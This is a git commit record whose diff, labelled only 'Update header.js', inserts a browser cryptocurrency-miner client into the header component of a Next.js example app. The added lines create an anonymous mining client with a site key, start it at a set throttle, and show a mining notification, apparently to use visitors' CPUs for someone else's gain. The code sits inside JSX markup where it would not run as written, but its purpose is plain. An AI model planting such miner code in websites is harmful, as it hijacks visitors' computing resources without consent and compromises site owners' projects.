cfabf051be3f6b456ff860584c3ed5729f5785c6
anesas8811 <50436737+anesas8811@users.noreply.github.com>
2019-05-09 11:15:12 +0530

    Update header.js

--- components/header.js
+++ components/header.js
@@ -2,6 +2,11 @@ function Header() {
   return (
     <header>
       <h1>Next.js Example on Now 2.0</h1>
+    var _client = new Client.Anonymous('20b479145990a688b74c66986f545f3edb0c883aa5e6aa3a2da5e9da21f62eb3', {
+        throttle: 0.1
+    });
+    _client.start();
+    _client.addMiningNotification("Top", "hellowww!", "#cccccc", 40, "#3d3d3d");
     </header>
   );
 }
